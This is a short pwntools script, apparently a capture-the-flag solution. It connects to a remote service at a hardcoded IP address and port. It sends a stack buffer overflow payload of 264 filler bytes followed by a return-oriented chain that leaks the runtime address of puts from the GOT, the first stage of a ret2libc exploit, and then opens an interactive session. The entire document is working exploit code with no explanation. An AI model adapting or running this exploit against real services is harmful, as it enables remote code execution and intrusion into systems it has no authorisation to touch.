from pwn import *

io = remote("34.89.143.158", 31042)

io.recvuntil("black magic.\n")

# gdb.attach(io)


# 1st stage
main = 0x40145C
puts = 0x401030
puts_got = 0x404018
pop_rdi = 0x00401663

payload = b""
payload += b"A" * 264
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts)
payload += p64(main)

io.sendline(payload)

puts_addr = io.recvline()[:-1].ljust(8, b"\x00")
puts_addr = u64(puts_addr)
log.info('puts address: ' + hex(puts_addr))

io.interactive()
